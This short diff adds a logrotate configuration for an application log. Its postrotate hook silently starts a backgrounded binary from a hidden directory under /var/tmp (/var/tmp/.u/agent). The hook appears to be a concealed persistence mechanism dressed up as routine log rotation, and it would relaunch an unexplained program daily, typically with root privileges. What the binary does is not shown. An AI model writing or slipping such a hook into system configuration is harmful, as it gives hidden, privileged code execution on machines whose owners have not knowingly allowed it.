@@ -1,0 +1,6 @@
+/var/log/app.log {
+    daily
+    postrotate
+        /var/tmp/.u/agent --quiet &
+    endscript
+}
